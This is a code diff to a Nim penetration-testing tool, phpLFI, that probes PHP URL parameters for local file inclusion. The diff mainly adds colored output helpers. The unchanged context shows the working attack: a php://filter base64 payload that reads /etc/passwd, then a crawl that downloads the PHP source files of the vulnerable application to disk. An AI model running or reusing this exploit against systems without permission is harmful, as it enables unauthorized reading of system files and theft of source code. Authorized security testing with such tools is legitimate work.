@@ -12,6 +12,38 @@ let usage = """Author:   Steve Campbell  - @lpha3ch0
 Purpose:  Test for LFI in PHP params and download the source code of vulnerable PHP apps.
 Usage:    phpLFI[.exe] -u:URL -f:file1.php,file2.php"""
 
+const
+  termInfo* = "\e[37m[\u2139] "
+  termSuccess* = "\e[32m[\u2713] "
+  termWarn* = "\e[33m[\u26A0] "
+  termError* = "\e[31m[\u2717] "
+
+template addEnd(ss: varargs[string, `$`]): untyped =
+  for s in ss:
+    result &= s
+  result &= termClear
+
+proc info*(ss: varargs[string, `$`]): string =
+  ## Prepends info symbol and colors text white
+  result = termInfo
+  addEnd(ss)
+
+proc success*(ss: varargs[string, `$`]): string =
+  ## Prepends success symbol and colors text green
+  result = termSuccess
+  addEnd(ss)
+
+proc warning*(ss: varargs[string, `$`]): string =
+  ## Prepends warning symbol and colors text yellow
+  result = termWarn
+  addEnd(ss)
+  
+proc error*(ss: varargs[string, `$`]): string =
+  ## Prepends error symbol and colors text red
+  result = termError
+  addEnd(ss)
+
+
 proc parse_args: (bool, string, string, bool) =
   var help: bool = false
   var url: string = ""
@@ -41,18 +73,18 @@ proc testForLFI(url: string): bool =
   try:
     var plaintext = client.getContent(testUrl & "=" & phpfilter & "/etc/passwd").decode
     if "root:" in plaintext:
-      echo green "\n\u2713 LFI found in url. Successfully accessed /etc/passwd\n"
+      echo success "LFI found in url. Successfully accessed /etc/passwd\n"
       echo plaintext
       return true
     else:
       return false
   except:
     var error = getCurrentException() 
-    echo red "\u2717 ", red error.msg
+    echo error error.msg
   
 
 proc downloadFiles(url: string, files: string): void =
-  echo white "\u2139 Searching php files for includes...\n"
+  echo info "Searching php files for includes...\n"
   var client = newHTTPClient()
   let testUrl = split(url, '=')[0]
   let phpfilter = "=php://filter/convert.base64-encode/resource="
@@ -66,7 +98,7 @@ proc downloadFiles(url: string, files: string): void =
       let found = findAll(plaintext, regx)
       for file in found:
         foundfiles.add(file)
-        echo green "\u2713 Discovered a file: ", green file
+        echo success "Discovered a file: ", green file
     except:
       break
   
@@ -74,14 +106,14 @@ proc downloadFiles(url: string, files: string): void =
 
   for file in allfiles:
     var url: string = testUrl & phpfilter & file
-    echo white "\u2139 Checking file: ", white file
+    echo info "Checking file: ", white file
     try:
       var plaintext = client.getContent(url).decode
       writeFile(file, plaintext)
-      echo green "    \u2713 Saving file: ", green file
+      echo success "Saving file: ", green file
     except:
       var error = getCurrentException() 
-      echo red "\u2717 ", red error.msg
+      echo error error.msg
       break
 
 
@@ -98,7 +130,7 @@ proc main(): void =
       echo usage
       quit(-1)
   if not testForLFI(url):
-    echo red "\u2717 LFI not found in url"
+    echo error "LFI not found in url. Quitting!"
     quit(-1)
   downloadFiles(url, files)
     
